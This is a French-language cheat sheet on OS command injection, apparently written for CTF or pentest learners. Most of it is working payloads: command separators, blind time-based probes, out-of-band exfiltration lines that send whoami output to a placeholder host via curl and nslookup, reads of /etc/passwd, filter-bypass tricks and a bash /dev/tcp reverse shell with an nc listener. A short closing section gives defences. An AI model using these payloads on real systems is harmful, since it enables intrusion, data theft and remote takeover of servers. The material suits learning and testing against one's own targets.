# Injection de commande

L'injection de commande arrive quand une entrée utilisateur finit dans une
chaîne que le serveur passe à un shell système. Si tu peux ajouter ta propre
commande à cette chaîne, tu exécutes du code sur la machine. Ça se cache
souvent derrière des fonctions qui appellent un binaire : outils de ping,
résolution DNS, convertisseurs de fichiers, « export PDF », tout ce qui sent
l'appel système.

Tous les exemples sont génériques. Rien ici n'est la solution d'un challenge précis.

## 1. La trouver

Prends un paramètre qui pourrait atteindre un shell et ajoute une deuxième
commande avec un séparateur :

```
; id
| id
& id
&& id
|| id
%0a id        (saut de ligne)
$(id)
`id`
```

`;`, le saut de ligne et `$(...)` enchaînent une commande ; `|` redirige ;
`&&`/`||` s'exécutent sur succès/échec. Si la réponse montre `uid=...`, tu as
l'exécution.

## 2. Quand tu ne vois pas la sortie (aveugle)

Pas de sortie dans la page ? Prouve l'exécution de deux façons :

**Basé sur le temps** — fais attendre la machine :

```
; sleep 5
$(sleep 5)
& ping -c 5 127.0.0.1 &
```

Réponse lente = la commande s'est exécutée.

**Hors-bande (OOB)** — fais parler la machine vers toi :

```
; curl http://TON-HOTE/$(whoami)
; nslookup $(whoami).TON-DOMAINE-COLLAB
```

Surveille ton listener / Burp Collaborator pour le callback, et tu exfiltres
même des données dans le sous-domaine ou le chemin.

## 3. Récupérer la sortie

Si ce n'est pas aveugle, redirige le résultat là où tu peux le lire :

```
; id > /var/www/html/out.txt       (puis ouvre le fichier)
; cat /etc/passwd
```

## 4. Contourner les filtres

Filtres courants et comment les passer :

- **Espaces bloqués** — `${IFS}` est un espace : `cat${IFS}/etc/passwd` ; ou
  `{cat,/etc/passwd}` ; ou la redirection `<`.
- **Mots-clés bloqués** — casse-les : `c""at`, `c\at`, `ca$@t` ; ou utilise des
  globs : `/bin/c?t /etc/passwd`, `/???/??t /etc/passwd`.
- **Séparateurs bloqués** — essaie ceux qui ne sont pas filtrés (`%0a`,
  `$(...)`, backticks) ou empile-les.
- **Encodage** — URL-encode le payload, ou fais décoder la cible :
  `$(echo aWQ=|base64 -d)`.

## 5. De l'exécution au shell

Une fois l'exécution de commande obtenue, passe à un reverse shell :

```
; bash -c 'bash -i >& /dev/tcp/TON-IP/4444 0>&1'
```

(écoute avec `nc -lvnp 4444`).

## 6. Se défendre

- **N'appelle pas de shell** avec une entrée utilisateur. Utilise les API du
  langage (`subprocess.run([...], shell=False)`, appels paramétrés) qui passent
  les arguments sous forme de liste, jamais une chaîne interprétée par le shell.
- Si tu dois vraiment, mets en place une **liste blanche** de valeurs exactes et
  rejette le reste ; échapper les métacaractères à la main est perdu d'avance.
- Fais tourner le service avec le moins de privilèges possible pour que
  l'exécution rapporte le moins possible à l'attaquant.

---

Fait par **White** · [github.com/white-exee](https://github.com/white-exee)
